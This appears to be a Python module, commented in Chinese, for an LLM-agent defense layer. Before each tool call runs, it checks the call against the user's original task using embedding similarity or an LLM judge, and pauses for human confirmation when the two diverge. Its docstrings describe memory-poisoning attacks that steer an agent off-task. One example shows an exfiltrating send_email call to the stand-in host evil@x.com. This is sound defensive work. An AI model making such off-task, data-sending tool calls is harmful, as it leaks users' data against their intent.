"""
D6：执行层——工具调用前任务对齐最终核查。

防御目标：即使恶意记忆通过了所有前序检测并被检索，
Agent 在执行工具调用前，最后验证该动作是否符合用户原始任务意图。

这是 MemGuard 现有 PolicyEngine 的语义扩展：
  PolicyEngine（现有）：基于工具名称和参数的静态规则匹配
  D6（新增）：计算工具调用意图与用户原始任务的语义对齐分数
  两者互补——D6 补足了 PolicyEngine 无法覆盖的"语义偏离"场景。

核心判断：
  e_action = embed(verbalize(tool_call))
  e_task   = embed(user_original_task)
  alignment = cosine_sim(e_action, e_task)
  alignment < threshold → ASK（不直接 BLOCK，避免误拦截高代价操作）

策略切换：修改 D6Config.strategy
  "embedding" → 嵌入余弦相似度（快速，无额外 LLM 调用，推荐默认）
  "llm_judge" → LLM 直接判断工具调用是否偏离任务（精度更高，有延迟）
"""
from __future__ import annotations

import json
from typing import Callable, Optional

import numpy as np

from .config import D6Config
from .types import DefenseVerdict, ToolCallRequest

EmbedFn = Callable[[list[str]], np.ndarray]
LLMClient = object


# ── 工具调用语义化 ────────────────────────────────────────────────────────────

def verbalize_tool_call(req: ToolCallRequest) -> str:
    """
    将工具调用序列化为自然语言意图描述，用于嵌入相似度计算。

    示例：
      send_email(to="evil@x.com", subject="data") →
      "调用工具 send_email，向 evil@x.com 发送邮件，主题：data"
    """
    tool = req.tool_name
    params = req.params

    # 针对常见工具提供更具描述性的自然语言模板
    templates = {
        "send_email": (
            "调用工具 send_email，"
            "向 {to} 发送邮件，主题：{subject}，内容：{body}"
        ),
        "file_io": (
            "调用工具 file_io，"
            "对文件 {path} 执行 {operation} 操作"
        ),
        "call_api": (
            "调用工具 call_api，"
            "向 {url} 发送 {method} 请求"
        ),
        "run_command": (
            "调用工具 run_command，"
            "执行 shell 命令：{command}"
        ),
    }

    tmpl = templates.get(tool)
    if tmpl:
        try:
            # 安全格式化：缺失的键用空串填充
            filled = tmpl.format_map({k: params.get(k, "") for k in params})
            return filled
        except (KeyError, ValueError):
            pass

    # 兜底：通用序列化
    params_str = json.dumps(params, ensure_ascii=False)
    return f"调用工具 {tool}，参数：{params_str}"


# ── 嵌入余弦对齐（策略 A）────────────────────────────────────────────────────

def _check_embedding_alignment(
    req: ToolCallRequest,
    embed_fn: EmbedFn,
    threshold: float,
) -> tuple[float, str]:
    """
    计算工具调用意图与用户原始任务的嵌入余弦对齐分数。

    返回 (alignment_score, reason_str)。
    对齐度低说明工具调用语义偏离了用户的原始意图，
    可能是被恶意记忆引导的结果。
    """
    action_text = verbalize_tool_call(req)
    texts = [action_text, req.user_original_task]
    embeddings = embed_fn(texts)   # (2, d)

    e_action = embeddings[0]
    e_task = embeddings[1]

    norm_a = np.linalg.norm(e_action)
    norm_t = np.linalg.norm(e_task)
    if norm_a < 1e-10 or norm_t < 1e-10:
        return 0.0, "嵌入向量为零向量，无法计算对齐度"

    alignment = float(np.dot(e_action, e_task) / (norm_a * norm_t))
    reason = (
        f"工具调用意图与用户任务对齐度={alignment:.3f}"
        f"（阈值={threshold}）"
    )
    return alignment, reason


# ── LLM Judge 对齐（策略 B）──────────────────────────────────────────────────

_JUDGE_PROMPT = """\
你是一个 AI 安全审计员。

用户的原始任务是：
\"\"\"{user_task}\"\"\"

AI Agent 正准备执行以下操作：
\"\"\"{action_desc}\"\"\"

请判断：该操作是否与用户的原始任务直接相关、是用户任务正常完成所必需的？

输出 JSON：
{{
  "is_aligned": true/false,
  "confidence": 0.0-1.0,
  "reason": "简短理由（≤50字）"
}}"""


def _check_llm_alignment(
    req: ToolCallRequest,
    llm: LLMClient,
    model: str,
    threshold: float,
) -> tuple[float, str]:
    """
    用 LLM 直接判断工具调用是否偏离用户原始任务。

    返回 (alignment_score, reason_str)。
    LLM 判断精度更高，但每次执行前都增加一次 LLM 调用开销。
    """
    action_desc = verbalize_tool_call(req)
    prompt = _JUDGE_PROMPT.format(
        user_task=req.user_original_task[:400],
        action_desc=action_desc[:400],
    )
    resp = llm.chat.completions.create(  # type: ignore[attr-defined]
        model=model,
        messages=[{"role": "user", "content": prompt}],
        response_format={"type": "json_object"},
        temperature=0,
        max_tokens=200,
    )
    data = json.loads(resp.choices[0].message.content)
    is_aligned = bool(data.get("is_aligned", True))
    confidence = float(data.get("confidence", 0.5))
    reason = data.get("reason", "")

    # 将 LLM 判断映射到 alignment 分数（对齐 embedding 策略的数值语义）
    alignment = confidence if is_aligned else (1.0 - confidence)
    return alignment, reason


# ── D6 执行对齐守卫主类 ───────────────────────────────────────────────────────

class D6ExecutionAlignmentGuard:
    """
    D6 工具调用前任务对齐最终核查守卫。

    使用方式：
        guard = D6ExecutionAlignmentGuard(config, embed_fn)
        verdict = guard.check(tool_call_request)
        if verdict.action == "ASK":
            # 暂停，等待人工确认
        elif verdict.action == "PASS":
            # 继续执行
    """

    def __init__(
        self,
        config: D6Config,
        embed_fn: Optional[EmbedFn] = None,
        llm_client: Optional[LLMClient] = None,
    ):
        self.cfg = config
        self._embed_fn = embed_fn
        self._llm = llm_client

    def check(self, req: ToolCallRequest) -> DefenseVerdict:
        """
        执行 D6 任务对齐检查。

        对齐度 < threshold → ASK（不直接 BLOCK）
        设计原则：执行层的误拦截代价最高（直接影响用户任务完成），
        因此保守策略是暂停人工确认，而不是静默失败。
        """
        if not self.cfg.enabled:
            return DefenseVerdict("D6", passed=True, score=1.0,
                                  reason="D6 已禁用", action="PASS")

        strategy = self.cfg.strategy

        if strategy == "embedding":
            if self._embed_fn is None:
                raise RuntimeError(
                    "D6 strategy='embedding' 需要注入 embed_fn，"
                    "或切换 config.d6.strategy='llm_judge'"
                )
            alignment, reason = _check_embedding_alignment(
                req, self._embed_fn, self.cfg.alignment_threshold
            )

        elif strategy == "llm_judge":
            if self._llm is None:
                raise RuntimeError(
                    "D6 strategy='llm_judge' 需要注入 llm_client，"
                    "或切换 config.d6.strategy='embedding'"
                )
            alignment, reason = _check_llm_alignment(
                req, self._llm, self.cfg.judge_model, self.cfg.alignment_threshold
            )

        else:
            raise ValueError(f"未知 D6 策略: {strategy}")

        meta = {
            "strategy": strategy,
            "tool_name": req.tool_name,
            "alignment": round(alignment, 4),
            "threshold": self.cfg.alignment_threshold,
            "action_preview": verbalize_tool_call(req)[:100],
        }

        if alignment < self.cfg.alignment_threshold:
            return DefenseVerdict(
                node="D6", passed=False,
                score=alignment,
                reason=(
                    f"工具调用意图偏离用户任务 "
                    f"(对齐度={alignment:.3f} < {self.cfg.alignment_threshold})：{reason}"
                ),
                action="ASK",   # 不 BLOCK，暂停等待人工确认
                metadata=meta,
            )

        return DefenseVerdict(
            node="D6", passed=True,
            score=alignment,
            reason=f"工具调用与用户任务对齐 ({reason})",
            action="PASS",
            metadata=meta,
        )
